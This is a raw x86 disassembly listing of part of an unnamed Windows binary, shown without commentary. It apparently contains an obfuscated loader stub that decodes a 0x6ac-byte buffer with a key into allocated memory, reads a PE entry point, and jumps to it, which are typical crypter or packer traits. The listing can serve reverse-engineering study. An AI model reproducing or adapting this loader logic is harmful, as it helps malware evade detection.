  4d07a2:	add    esp,0x4
  4d07a5:	pop    edi
  4d07a6:	push   edi
  4d07a7:	push   DWORD PTR [edi+0x54]
  4d07aa:	push   edx
  4d07ab:	push   DWORD PTR [edi+0xbc]
  4d07b1:	push   ecx
  4d07b2:	call   0x4d0c74
  4d07b7:	add    esp,0x10
  4d07ba:	pop    edi
  4d07bb:	push   edi
  4d07bc:	lea    esi,[edi-0x1f0]
  4d07c2:	push   esi
  4d07c3:	call   0x4d141c
  4d07c8:	add    esp,0x4
  4d07cb:	test   eax,eax
  4d07cd:	jne    0x4d07bc
  4d07cf:	pop    edi
  4d07d0:	add    esp,0x44
  4d07d3:	pop    ebp
  4d07d4:	ret    
  4d07d5:	add    BYTE PTR [eax],al
  4d07d7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d07dd:	sub    esp,0x38
  4d07e0:	lea    ecx,[esi-0xd0]
  4d07e6:	and    DWORD PTR [ebp-0x2c],0xd23
  4d07ed:	push   ecx
  4d07ee:	push   0x0
  4d07f0:	call   0x4d13c0
  4d07f5:	add    esp,0x4
  4d07f8:	pop    ecx
  4d07f9:	push   ecx
  4d07fa:	push   DWORD PTR [ecx+0x1f0]
  4d0800:	push   ebx
  4d0801:	push   DWORD PTR [ecx+0x124]
  4d0807:	push   esi
  4d0808:	call   0x4d0df8
  4d080d:	add    esp,0x10
  4d0810:	pop    ecx
  4d0811:	push   ecx
  4d0812:	mov    edx,0xfffffff4
  4d0817:	push   edx
  4d0818:	call   0x4d0d84
  4d081d:	add    esp,0x4
  4d0820:	pop    ecx
  4d0821:	add    esp,0x38
  4d0824:	pop    ebp
  4d0825:	ret    
  4d0826:	add    BYTE PTR [eax],al
  4d0828:	mov    edi,edi
  4d082a:	push   ebp
  4d082b:	mov    ebp,esp
  4d082d:	sub    esp,0x30
  4d0830:	mov    eax,0x4d31cc
  4d0835:	add    DWORD PTR [ebp-0x1c],0x79a
  4d083c:	push   eax
  4d083d:	push   edx
  4d083e:	push   edi
  4d083f:	push   DWORD PTR [eax+0xb8]
  4d0845:	push   DWORD PTR [eax]
  4d0847:	call   0x4d0e98
  4d084c:	add    esp,0x10
  4d084f:	pop    eax
  4d0850:	push   eax
  4d0851:	push   0x0
  4d0853:	call   0x4d10b8
  4d0858:	add    esp,0x4
  4d085b:	pop    eax
  4d085c:	mov    edx,0x4d202c
  4d0861:	mov    edx,DWORD PTR [edx]
  4d0863:	push   edx
  4d0864:	push   DWORD PTR [eax-0x34]
  4d0867:	pop    ebx
  4d0868:	call   ebx
  4d086a:	add    esp,0x30
  4d086d:	pop    ebp
  4d086e:	ret    
  4d086f:	add    BYTE PTR [edi-0x1],bl
  4d0872:	adc    eax,0x4d2004
  4d0877:	call   edi
  4d0879:	add    BYTE PTR [eax],al
  4d087b:	add    BYTE PTR [edi-0x1],bl
  4d087e:	adc    eax,0x4d205c
  4d0883:	call   edi
  4d0885:	add    BYTE PTR [eax],al
  4d0887:	add    BYTE PTR [edi-0x1],bl
  4d088a:	adc    eax,0x4d2054
  4d088f:	call   edi
  4d0891:	add    BYTE PTR [eax],al
  4d0893:	add    BYTE PTR [edi-0x1],bl
  4d0896:	adc    eax,0x4d2090
  4d089b:	call   edi
  4d089d:	add    BYTE PTR [eax],al
  4d089f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d08a5:	sub    esp,0x40
  4d08a8:	mov    eax,0x4d306c
  4d08ad:	cmp    eax,0x768b
  4d08b2:	je     0x4d08a3
  4d08b4:	push   eax
  4d08b5:	push   ecx
  4d08b6:	push   DWORD PTR [eax+0x178]
  4d08bc:	push   edi
  4d08bd:	push   DWORD PTR [eax+0x114]
  4d08c3:	call   0x4d0a28
  4d08c8:	add    esp,0x10
  4d08cb:	pop    eax
  4d08cc:	push   eax
  4d08cd:	push   0x0
  4d08cf:	call   0x4d0acc
  4d08d4:	add    esp,0x4
  4d08d7:	pop    eax
  4d08d8:	push   eax
  4d08d9:	call   0x4d073c
  4d08de:	add    esp,0x4
  4d08e1:	pop    eax
  4d08e2:	add    esp,0x40
  4d08e5:	pop    ebp
  4d08e6:	ret    
  4d08e7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d08ed:	sub    esp,0x3c
  4d08f0:	lea    edx,[esi-0xec]
  4d08f6:	mov    edi,DWORD PTR [ebp-0x30]
  4d08f9:	push   edx
  4d08fa:	mov    edx,0x0
  4d08ff:	push   edx
  4d0900:	call   0x4d13c0
  4d0905:	add    esp,0x4
  4d0908:	pop    edx
  4d0909:	push   edx
  4d090a:	push   DWORD PTR [edx+0x2c]
  4d090d:	push   eax
  4d090e:	push   DWORD PTR [edx+0x8]
  4d0911:	push   eax
  4d0912:	call   0x4d06ec
  4d0917:	add    esp,0x10
  4d091a:	pop    edx
  4d091b:	push   edx
  4d091c:	mov    edx,0x0
  4d0921:	push   edx
  4d0922:	call   0x4d0dec
  4d0927:	add    esp,0x4
  4d092a:	pop    edx
  4d092b:	add    esp,0x3c
  4d092e:	pop    ebp
  4d092f:	ret    
  4d0930:	mov    edi,edi
  4d0932:	push   ebp
  4d0933:	mov    ebp,esp
  4d0935:	sub    esp,0x5c
  4d0938:	lea    esi,ds:0x4d3154
  4d093e:	sbb    DWORD PTR [esi+0x80],0x6f
  4d0945:	push   0x0
  4d0947:	call   0x4d0fbc
  4d094c:	add    esp,0x4
  4d094f:	push   esi
  4d0950:	push   edx
  4d0951:	push   DWORD PTR [esi+0x1d0]
  4d0957:	call   0x4d10dc
  4d095c:	add    esp,0x8
  4d095f:	pop    esi
  4d0960:	push   0x0
  4d0962:	call   0x4d0dec
  4d0967:	add    esp,0x4
  4d096a:	add    esp,0x5c
  4d096d:	pop    ebp
  4d096e:	ret    
  4d096f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0975:	sub    esp,0x50
  4d0978:	or     ecx,DWORD PTR [eax-0x4]
  4d097b:	mov    esi,0x4d302c
  4d0980:	push   0x6ac
  4d0985:	push   0x6ac
  4d098a:	mov    eax,0x40001
  4d098f:	push   eax
  4d0990:	mov    edx,0x862985be
  4d0995:	push   DWORD PTR [edx+0x7a239a86]
  4d099b:	sub    DWORD PTR [esp],0x2
  4d099f:	mov    edx,0x4d2040
  4d09a4:	pop    DWORD PTR [edx]
  4d09a6:	call   0x4d1428
  4d09ab:	add    esp,0x4
  4d09ae:	push   eax
  4d09af:	pop    DWORD PTR [esi+0x16c]
  4d09b5:	mov    eax,DWORD PTR [esi+0x16c]
  4d09bb:	lea    eax,[eax]
  4d09bd:	sub    ecx,ecx
  4d09bf:	dec    ecx
  4d09c0:	and    ecx,0x4d0014
  4d09c6:	mov    ebx,0xd5d9a824
  4d09cb:	xor    edi,edi
  4d09cd:	xor    edx,edx
  4d09cf:	push   DWORD PTR [ecx+edx*1]
  4d09d2:	add    DWORD PTR [esp],ebx
  4d09d5:	pop    DWORD PTR [eax+edx*2]
  4d09d8:	dec    DWORD PTR [eax]
  4d09da:	xor    ebx,ebx
  4d09dc:	add    ebx,DWORD PTR [ecx]
  4d09de:	add    ecx,0x4
  4d09e1:	add    eax,0x4
  4d09e4:	add    edi,0x4
  4d09e7:	cmp    edi,0x6ac
  4d09ed:	jne    0x4d09cd
  4d09ef:	lea    edx,[esi-0x2c]
  4d09f2:	push   edx
  4d09f3:	call   0x4d141c
  4d09f8:	add    esp,0x4
  4d09fb:	test   eax,eax
  4d09fd:	jne    0x4d09f0
  4d09ff:	add    esp,0x50
  4d0a02:	pop    ebp
  4d0a03:	ret    
  4d0a04:	pop    edi
  4d0a05:	call   DWORD PTR ds:0x4d2048
  4d0a0b:	call   edi
  4d0a0d:	add    BYTE PTR [eax],al
  4d0a0f:	add    BYTE PTR [edi-0x1],bl
  4d0a12:	adc    eax,0x4d2094
  4d0a17:	call   edi
  4d0a19:	add    BYTE PTR [eax],al
  4d0a1b:	add    BYTE PTR [edi-0x1],bl
  4d0a1e:	adc    eax,0x4d2074
  4d0a23:	call   edi
  4d0a25:	add    BYTE PTR [eax],al
  4d0a27:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0a2d:	sub    esp,0x34
  4d0a30:	lea    ecx,[eax+0xc]
  4d0a33:	cmp    ecx,0x531d
  4d0a39:	jbe    0x4d0a2b
  4d0a3b:	push   ecx
  4d0a3c:	call   0x4d0c68
  4d0a41:	add    esp,0x4
  4d0a44:	pop    ecx
  4d0a45:	push   ecx
  4d0a46:	push   esi
  4d0a47:	push   DWORD PTR [ecx+0x1e4]
  4d0a4d:	push   DWORD PTR [ecx+0x144]
  4d0a53:	call   0x4d0b2c
  4d0a58:	add    esp,0xc
  4d0a5b:	pop    ecx
  4d0a5c:	push   ecx
  4d0a5d:	call   0x4d0c68
  4d0a62:	add    esp,0x4
  4d0a65:	pop    ecx
  4d0a66:	add    esp,0x34
  4d0a69:	pop    ebp
  4d0a6a:	ret    
  4d0a6b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0a71:	sub    esp,0x60
  4d0a74:	mov    esi,0x4d3114
  4d0a79:	or     DWORD PTR [esi+0xc4],0xfffffffa
  4d0a80:	push   esi
  4d0a81:	push   DWORD PTR [esi+0x170]
  4d0a87:	push   ecx
  4d0a88:	push   eax
  4d0a89:	push   DWORD PTR [esi+0xb8]
  4d0a8f:	call   0x4d0748
  4d0a94:	add    esp,0x10
  4d0a97:	pop    esi
  4d0a98:	lea    edi,[esi-0x114]
  4d0a9e:	push   edi
  4d0a9f:	call   0x4d141c
  4d0aa4:	add    esp,0x4
  4d0aa7:	test   eax,eax
  4d0aa9:	jne    0x4d0a99
  4d0aab:	mov    edi,0x0
  4d0ab0:	push   edi
  4d0ab1:	call   0x4d10b8
  4d0ab6:	add    esp,0x4
  4d0ab9:	add    esp,0x60
  4d0abc:	pop    ebp
  4d0abd:	ret    
  4d0abe:	add    BYTE PTR [eax],al
  4d0ac0:	pop    edi
  4d0ac1:	call   DWORD PTR ds:0x4d2078
  4d0ac7:	call   edi
  4d0ac9:	add    BYTE PTR [eax],al
  4d0acb:	add    BYTE PTR [edi-0x1],bl
  4d0ace:	adc    eax,0x4d2028
  4d0ad3:	call   edi
  4d0ad5:	add    BYTE PTR [eax],al
  4d0ad7:	add    BYTE PTR [edi-0x1],bl
  4d0ada:	adc    eax,0x4d2024
  4d0adf:	call   edi
  4d0ae1:	add    BYTE PTR [eax],al
  4d0ae3:	add    BYTE PTR [edi-0x1],bl
  4d0ae6:	adc    eax,0x4d2084
  4d0aeb:	call   edi
  4d0aed:	add    BYTE PTR [eax],al
  4d0aef:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0af5:	sub    esp,0x38
  4d0af8:	mov    eax,0x4d3084
  4d0afd:	add    ebx,DWORD PTR [ebp-0x30]
  4d0b00:	push   eax
  4d0b01:	call   0x4d073c
  4d0b06:	add    esp,0x4
  4d0b09:	pop    eax
  4d0b0a:	push   eax
  4d0b0b:	push   DWORD PTR [eax+0x108]
  4d0b11:	push   esi
  4d0b12:	call   0x4d0970
  4d0b17:	add    esp,0x8
  4d0b1a:	pop    eax
  4d0b1b:	push   eax
  4d0b1c:	push   0x0
  4d0b1e:	call   0x4d0dec
  4d0b23:	add    esp,0x4
  4d0b26:	pop    eax
  4d0b27:	add    esp,0x38
  4d0b2a:	pop    ebp
  4d0b2b:	ret    
  4d0b2c:	mov    edi,edi
  4d0b2e:	push   ebp
  4d0b2f:	mov    ebp,esp
  4d0b31:	sub    esp,0x54
  4d0b34:	mov    esi,0x4d3078
  4d0b39:	add    DWORD PTR [esi+0x104],0xfcf
  4d0b43:	call   0x4d0c68
  4d0b48:	add    esp,0x4
  4d0b4b:	push   esi
  4d0b4c:	push   ebx
  4d0b4d:	push   DWORD PTR [esi+0x134]
  4d0b53:	push   DWORD PTR [esi+0x9c]
  4d0b59:	push   DWORD PTR [esi+0x10c]
  4d0b5f:	call   0x4d1254
  4d0b64:	add    esp,0x10
  4d0b67:	pop    esi
  4d0b68:	push   0x0
  4d0b6a:	call   0x4d0ac0
  4d0b6f:	add    esp,0x4
  4d0b72:	add    esp,0x54
  4d0b75:	pop    ebp
  4d0b76:	ret    
  4d0b77:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0b7d:	sub    esp,0x50
  4d0b80:	mov    edi,0x4d3130
  4d0b85:	mov    eax,DWORD PTR [ebp-0x18]
  4d0b88:	push   edi
  4d0b89:	push   ebx
  4d0b8a:	push   ebx
  4d0b8b:	push   ebx
  4d0b8c:	call   0x4d1504
  4d0b91:	add    esp,0xc
  4d0b94:	pop    edi
  4d0b95:	push   edi
  4d0b96:	push   0x0
  4d0b98:	call   0x4d13c0
  4d0b9d:	add    esp,0x4
  4d0ba0:	pop    edi
  4d0ba1:	push   edi
  4d0ba2:	lea    ebx,[edi-0x130]
  4d0ba8:	push   ebx
  4d0ba9:	call   0x4d141c
  4d0bae:	add    esp,0x4
  4d0bb1:	test   eax,eax
  4d0bb3:	jne    0x4d0ba2
  4d0bb5:	pop    edi
  4d0bb6:	add    esp,0x50
  4d0bb9:	pop    ebp
  4d0bba:	ret    
  4d0bbb:	add    BYTE PTR [edi-0x1],bl
  4d0bbe:	adc    eax,0x4d2060
  4d0bc3:	call   edi
  4d0bc5:	add    BYTE PTR [eax],al
  4d0bc7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0bcd:	sub    esp,0x34
  4d0bd0:	lea    ebx,ds:0x4d30e0
  4d0bd6:	adc    DWORD PTR [ebp-0x1c],0xffffffd8
  4d0bda:	push   ebx
  4d0bdb:	push   edi
  4d0bdc:	push   eax
  4d0bdd:	push   esi
  4d0bde:	push   esi
  4d0bdf:	call   0x4d0af0
  4d0be4:	add    esp,0x10
  4d0be7:	pop    ebx
  4d0be8:	push   0x0
  4d0bea:	call   0x4d13c0
  4d0bef:	add    esp,0x4
  4d0bf2:	mov    ecx,0xfffffff4
  4d0bf7:	push   ecx
  4d0bf8:	call   0x4d0d84
  4d0bfd:	add    esp,0x4
  4d0c00:	add    esp,0x34
  4d0c03:	pop    ebp
  4d0c04:	ret    
  4d0c05:	add    BYTE PTR [eax],al
  4d0c07:	add    BYTE PTR [edi-0x1],bl
  4d0c0a:	adc    eax,0x4d200c
  4d0c0f:	call   edi
  4d0c11:	add    BYTE PTR [eax],al
  4d0c13:	add    BYTE PTR [edi-0x1],bl
  4d0c16:	adc    eax,0x4d2010
  4d0c1b:	call   edi
  4d0c1d:	add    BYTE PTR [eax],al
  4d0c1f:	add    BYTE PTR [edi+0x2b],dl
  4d0c22:	call   DWORD PTR [edi+0x57]
  4d0c25:	push   edi
  4d0c26:	push   edi
  4d0c27:	call   0x4d073c
  4d0c2c:	sub    esp,0xfffffffc
  4d0c2f:	call   0x4d0a04
  4d0c34:	push   0x2
  4d0c36:	xor    eax,eax
  4d0c38:	dec    eax
  4d0c39:	and    eax,0x4d3030
  4d0c3e:	push   0x0
  4d0c40:	lea    ecx,[eax+0x6]
  4d0c43:	add    BYTE PTR [ecx],0x41
  4d0c46:	push   eax
  4d0c47:	call   0x4d1428
  4d0c4c:	pop    edi
  4d0c4d:	pop    edi
  4d0c4e:	pop    edi
  4d0c4f:	lea    edi,[eax+0x3b]
  4d0c52:	mov    edi,DWORD PTR [edi]
  4d0c54:	lea    eax,[eax+edi*1]
  4d0c57:	mov    eax,DWORD PTR [eax+0x28]
  4d0c5a:	pusha  
  4d0c5b:	mov    ah,0x45
  4d0c5d:	sub    al,ah
  4d0c5f:	ja     0x4d0828
  4d0c65:	popa   
  4d0c66:	ret    
  4d0c67:	add    BYTE PTR [edi-0x1],bl
  4d0c6a:	adc    eax,0x4d2018
  4d0c6f:	call   edi
  4d0c71:	add    BYTE PTR [eax],al
  4d0c73:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0c79:	sub    esp,0x50
  4d0c7c:	lea    ebx,ds:0x4d30f4
  4d0c82:	adc    DWORD PTR [ebp-0x44],0xffff99b6
  4d0c89:	push   ebx
  4d0c8a:	push   ecx
  4d0c8b:	push   DWORD PTR [ebx+0x1ac]
  4d0c91:	push   DWORD PTR [ebx+0x1f8]
  4d0c97:	push   DWORD PTR [ebx+0x180]
  4d0c9d:	call   0x4d120c
  4d0ca2:	add    esp,0x10
  4d0ca5:	pop    ebx
  4d0ca6:	call   0x4d0c68
  4d0cab:	add    esp,0x4
  4d0cae:	lea    edi,[ebx-0xf4]
  4d0cb4:	push   edi
  4d0cb5:	call   0x4d141c
  4d0cba:	add    esp,0x4
  4d0cbd:	test   eax,eax
  4d0cbf:	jne    0x4d0caf
  4d0cc1:	add    esp,0x50
  4d0cc4:	pop    ebp
  4d0cc5:	ret    
  4d0cc6:	add    BYTE PTR [eax],al
  4d0cc8:	pop    edi
  4d0cc9:	call   DWORD PTR ds:0x4d2038
  4d0ccf:	call   edi
  4d0cd1:	add    BYTE PTR [eax],al
  4d0cd3:	add    BYTE PTR [edi-0x1],bl
  4d0cd6:	adc    eax,0x4d2088
  4d0cdb:	call   edi
  4d0cdd:	add    BYTE PTR [eax],al
  4d0cdf:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0ce5:	sub    esp,0x60
  4d0ce8:	lea    edi,[ecx-0xb4]
  4d0cee:	add    DWORD PTR [ebp-0x2c],ecx
  4d0cf1:	push   edi
  4d0cf2:	push   DWORD PTR [edi+0x60]
  4d0cf5:	push   DWORD PTR [edi+0xd4]
  4d0cfb:	push   DWORD PTR [edi+0x1c8]
  4d0d01:	push   eax
  4d0d02:	call   0x4d155c
  4d0d07:	add    esp,0x10
  4d0d0a:	pop    edi
  4d0d0b:	push   edi
  4d0d0c:	lea    edi,[edi-0x10]
  4d0d0f:	push   edi
  4d0d10:	call   0x4d141c
  4d0d15:	add    esp,0x4
  4d0d18:	test   eax,eax
  4d0d1a:	jne    0x4d0d0c
  4d0d1c:	pop    edi
  4d0d1d:	push   edi
  4d0d1e:	push   0x0
  4d0d20:	call   0x4d10b8
  4d0d25:	add    esp,0x4
  4d0d28:	pop    edi
  4d0d29:	add    esp,0x60
  4d0d2c:	pop    ebp
  4d0d2d:	ret    
  4d0d2e:	add    BYTE PTR [eax],al
  4d0d30:	pop    edi
  4d0d31:	call   DWORD PTR ds:0x4d20a0
  4d0d37:	call   edi
  4d0d39:	add    BYTE PTR [eax],al
  4d0d3b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0d41:	sub    esp,0x38
  4d0d44:	lea    esi,[eax-0xac]
  4d0d4a:	cmp    esi,0x4573
  4d0d50:	je     0x4d0d3f
  4d0d52:	push   esi
  4d0d53:	push   eax
  4d0d54:	push   DWORD PTR [esi+0x180]
  4d0d5a:	push   DWORD PTR [esi+0x10]
  4d0d5d:	push   edi
  4d0d5e:	call   0x4d08e8
  4d0d63:	add    esp,0x10
  4d0d66:	pop    esi
  4d0d67:	mov    ecx,0x0
  4d0d6c:	push   ecx
  4d0d6d:	call   0x4d1164
  4d0d72:	add    esp,0x4
  4d0d75:	push   0x0
  4d0d77:	call   0x4d10c4
  4d0d7c:	add    esp,0x4
  4d0d7f:	add    esp,0x38
  4d0d82:	pop    ebp
  4d0d83:	ret    
  4d0d84:	pop    edi
  4d0d85:	call   DWORD PTR ds:0x4d2030
  4d0d8b:	call   edi
  4d0d8d:	add    BYTE PTR [eax],al
  4d0d8f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0d95:	sub    esp,0x44
  4d0d98:	lea    edi,ds:0x4d307c
  4d0d9e:	cmp    edi,0x2923
  4d0da4:	jb     0x4d0d93
  4d0da6:	push   edi
  4d0da7:	mov    eax,0xfffffff4
  4d0dac:	push   eax
  4d0dad:	call   0x4d0d84
  4d0db2:	add    esp,0x4
  4d0db5:	pop    edi
  4d0db6:	push   edi
  4d0db7:	push   DWORD PTR [edi+0xf0]
  4d0dbd:	push   DWORD PTR [edi+0x74]
  4d0dc0:	push   edx
  4d0dc1:	push   esi
  4d0dc2:	call   0x4d1024
  4d0dc7:	add    esp,0x10
  4d0dca:	pop    edi
  4d0dcb:	push   edi
  4d0dcc:	mov    edx,0x0
  4d0dd1:	push   edx
  4d0dd2:	call   0x4d1164
  4d0dd7:	add    esp,0x4
  4d0dda:	pop    edi
  4d0ddb:	add    esp,0x44
  4d0dde:	pop    ebp
  4d0ddf:	ret    
  4d0de0:	pop    edi
  4d0de1:	call   DWORD PTR ds:0x4d2058
  4d0de7:	call   edi
  4d0de9:	add    BYTE PTR [eax],al
  4d0deb:	add    BYTE PTR [edi-0x1],bl
  4d0dee:	adc    eax,0x4d2034
  4d0df3:	call   edi
  4d0df5:	add    BYTE PTR [eax],al
  4d0df7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0dfd:	sub    esp,0x54
  4d0e00:	mov    ebx,0x4d31a0
  4d0e05:	cmp    ebx,0x340b
  4d0e0b:	je     0x4d0dfb
  4d0e0d:	mov    esi,0x0
  4d0e12:	push   esi
  4d0e13:	call   0x4d0870
  4d0e18:	add    esp,0x4
  4d0e1b:	push   ebx
  4d0e1c:	push   edi
  4d0e1d:	push   edx
  4d0e1e:	push   esi
  4d0e1f:	push   DWORD PTR [ebx+0x124]
  4d0e25:	call   0x4d12a8
  4d0e2a:	add    esp,0x10
  4d0e2d:	pop    ebx
  4d0e2e:	call   0x4d073c
  4d0e33:	add    esp,0x4
  4d0e36:	add    esp,0x54
  4d0e39:	pop    ebp
  4d0e3a:	ret    
  4d0e3b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0e41:	sub    esp,0x40
  4d0e44:	lea    edi,ds:0x4d3100
  4d0e4a:	or     ecx,DWORD PTR [ebp-0x20]
  4d0e4d:	push   edi
  4d0e4e:	push   0x0
  4d0e50:	call   0x4d0870
  4d0e55:	add    esp,0x4
  4d0e58:	pop    edi
  4d0e59:	push   edi
  4d0e5a:	push   DWORD PTR [edi+0x14c]
  4d0e60:	push   DWORD PTR [edi+0x130]
  4d0e66:	push   DWORD PTR [edi+0xa0]
  4d0e6c:	push   ebx
  4d0e6d:	call   0x4d13cc
  4d0e72:	add    esp,0x10
  4d0e75:	pop    edi
  4d0e76:	push   edi
  4d0e77:	mov    esi,0x0
  4d0e7c:	push   esi
  4d0e7d:	call   0x4d0888
  4d0e82:	add    esp,0x4
  4d0e85:	pop    edi
  4d0e86:	add    esp,0x40
  4d0e89:	pop    ebp
  4d0e8a:	ret    
  4d0e8b:	add    BYTE PTR [edi-0x1],bl
  4d0e8e:	adc    eax,0x4d206c
  4d0e93:	call   edi
  4d0e95:	add    BYTE PTR [eax],al
  4d0e97:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0e9d:	sub    esp,0x60
  4d0ea0:	lea    ebx,[eax-0xf0]
  4d0ea6:	cmp    ebx,0x7241
  4d0eac:	je     0x4d0e9b
  4d0eae:	push   ebx
  4d0eaf:	push   DWORD PTR [ebx+0x130]
  4d0eb5:	push   DWORD PTR [ebx+0x178]
  4d0ebb:	push   edx
  4d0ebc:	push   DWORD PTR [ebx+0x1c]
  4d0ebf:	call   0x4d0a6c
  4d0ec4:	add    esp,0x10
  4d0ec7:	pop    ebx
  4d0ec8:	push   0x0
  4d0eca:	call   0x4d10c4
  4d0ecf:	add    esp,0x4
  4d0ed2:	push   0x0
  4d0ed4:	call   0x4d1164
  4d0ed9:	add    esp,0x4
  4d0edc:	add    esp,0x60
  4d0edf:	pop    ebp
  4d0ee0:	ret    
  4d0ee1:	add    BYTE PTR [eax],al
  4d0ee3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0ee9:	sub    esp,0x58
  4d0eec:	mov    ebx,0x4d3168
  4d0ef1:	or     edi,esi
  4d0ef3:	push   ebx
  4d0ef4:	push   esi
  4d0ef5:	push   DWORD PTR [ebx+0x15c]
  4d0efb:	call   0x4d0930
  4d0f00:	add    esp,0x8
  4d0f03:	pop    ebx
  4d0f04:	mov    edx,0x0
  4d0f09:	push   edx
  4d0f0a:	call   0x4d0acc
  4d0f0f:	add    esp,0x4
  4d0f12:	push   0x0
  4d0f14:	call   0x4d0ac0
  4d0f19:	add    esp,0x4
  4d0f1c:	add    esp,0x58
  4d0f1f:	pop    ebp
  4d0f20:	ret    
  4d0f21:	add    BYTE PTR [eax],al
  4d0f23:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0f29:	sub    esp,0x50
  4d0f2c:	mov    edi,0x4d304c
  4d0f31:	add    DWORD PTR [ebp-0x14],0x18
  4d0f35:	push   edi
  4d0f36:	push   DWORD PTR [edi+0x188]
  4d0f3c:	push   DWORD PTR [edi+0x34]
  4d0f3f:	call   0x4d1338
  4d0f44:	add    esp,0x8
  4d0f47:	pop    edi
  4d0f48:	push   edi
  4d0f49:	push   0x0
  4d0f4b:	call   0x4d10b8
  4d0f50:	add    esp,0x4
  4d0f53:	pop    edi
  4d0f54:	push   edi
  4d0f55:	mov    eax,0x0
  4d0f5a:	push   eax
  4d0f5b:	call   0x4d10c4
  4d0f60:	add    esp,0x4
  4d0f63:	pop    edi
  4d0f64:	add    esp,0x50
  4d0f67:	pop    ebp
  4d0f68:	ret    
  4d0f69:	add    BYTE PTR [eax],al
  4d0f6b:	add    BYTE PTR [edi-0x1],bl
  4d0f6e:	adc    eax,0x4d2064
  4d0f73:	call   edi
  4d0f75:	add    BYTE PTR [eax],al
  4d0f77:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0f7d:	sub    esp,0x1c
  4d0f80:	lea    ebx,ds:0x4d31e8
  4d0f86:	sbb    DWORD PTR [ebx-0x4c],0x6752
  4d0f8d:	push   ebx
  4d0f8e:	push   esi
  4d0f8f:	push   esi
  4d0f90:	push   DWORD PTR [ebx+0x30]
  4d0f93:	call   0x4d1120
  4d0f98:	add    esp,0xc
  4d0f9b:	pop    ebx
  4d0f9c:	mov    edi,0x0
  4d0fa1:	push   edi
  4d0fa2:	call   0x4d0dec
  4d0fa7:	add    esp,0x4
  4d0faa:	push   0x0
  4d0fac:	call   0x4d10c4
  4d0fb1:	add    esp,0x4
  4d0fb4:	add    esp,0x1c
  4d0fb7:	pop    ebp
  4d0fb8:	ret    
  4d0fb9:	add    BYTE PTR [eax],al
  4d0fbb:	add    BYTE PTR [edi-0x1],bl
  4d0fbe:	adc    eax,0x4d2000
  4d0fc3:	call   edi
  4d0fc5:	add    BYTE PTR [eax],al
  4d0fc7:	add    BYTE PTR [edi-0x1],bl
  4d0fca:	adc    eax,0x4d2008
  4d0fcf:	call   edi
  4d0fd1:	add    BYTE PTR [eax],al
  4d0fd3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0fd9:	sub    esp,0x34
  4d0fdc:	lea    ecx,ds:0x4d3178
  4d0fe2:	adc    DWORD PTR [ecx-0x84],0x6f
  4d0fe9:	push   ecx
  4d0fea:	push   DWORD PTR [ecx+0x48]
  4d0fed:	push   esi
  4d0fee:	call   0x4d0ee4
  4d0ff3:	add    esp,0x8
  4d0ff6:	pop    ecx
  4d0ff7:	push   ecx
  4d0ff8:	mov    edi,0x0
  4d0ffd:	push   edi
  4d0ffe:	call   0x4d0dec
  4d1003:	add    esp,0x4
  4d1006:	pop    ecx
  4d1007:	push   ecx
  4d1008:	push   0xfffffff4
  4d100a:	call   0x4d0d84
  4d100f:	add    esp,0x4
  4d1012:	pop    ecx
  4d1013:	add    esp,0x34
  4d1016:	pop    ebp
  4d1017:	ret    
  4d1018:	pop    edi
  4d1019:	call   DWORD PTR ds:0x4d2070
  4d101f:	call   edi
  4d1021:	add    BYTE PTR [eax],al
  4d1023:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1029:	sub    esp,0x34
  4d102c:	lea    edx,ds:0x4d30fc
  4d1032:	and    esi,ecx
  4d1034:	push   edx
  4d1035:	push   eax
  4d1036:	push   DWORD PTR [edx+0x114]
  4d103c:	call   0x4d1378
  4d1041:	add    esp,0x8
  4d1044:	pop    edx
  4d1045:	push   edx
  4d1046:	call   0x4d0cc8
  4d104b:	add    esp,0x4
  4d104e:	pop    edx
  4d104f:	push   edx
  4d1050:	mov    ecx,0x0
  4d1055:	push   ecx
  4d1056:	call   0x4d0888
  4d105b:	add    esp,0x4
  4d105e:	pop    edx
  4d105f:	add    esp,0x34
  4d1062:	pop    ebp
  4d1063:	ret    
  4d1064:	mov    edi,edi
  4d1066:	push   ebp
  4d1067:	mov    ebp,esp
  4d1069:	sub    esp,0x44
  4d106c:	mov    esi,0x4d31a8
  4d1071:	xor    DWORD PTR [ebp-0x14],0xffffe1e2
  4d1078:	mov    edi,0x0
  4d107d:	push   edi
  4d107e:	call   0x4d0ac0
  4d1083:	add    esp,0x4
  4d1086:	push   esi
  4d1087:	push   DWORD PTR [esi+0x1e8]
  4d108d:	push   DWORD PTR [esi+0x4c]
  4d1090:	call   0x4d0fd4
  4d1095:	add    esp,0x8
  4d1098:	pop    esi
  4d1099:	mov    edi,0x0
  4d109e:	push   edi
  4d109f:	call   0x4d0acc
  4d10a4:	add    esp,0x4
  4d10a7:	add    esp,0x44
  4d10aa:	pop    ebp
  4d10ab:	ret    
  4d10ac:	pop    edi
  4d10ad:	call   DWORD PTR ds:0x4d203c
  4d10b3:	call   edi
  4d10b5:	add    BYTE PTR [eax],al
  4d10b7:	add    BYTE PTR [edi-0x1],bl
  4d10ba:	adc    eax,0x4d204c
  4d10bf:	call   edi
  4d10c1:	add    BYTE PTR [eax],al
  4d10c3:	add    BYTE PTR [edi-0x1],bl
  4d10c6:	adc    eax,0x4d2014
  4d10cb:	call   edi
  4d10cd:	add    BYTE PTR [eax],al
  4d10cf:	add    BYTE PTR [edi-0x1],bl
  4d10d2:	adc    eax,0x4d2080
  4d10d7:	call   edi
  4d10d9:	add    BYTE PTR [eax],al
  4d10db:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d10e1:	sub    esp,0x48
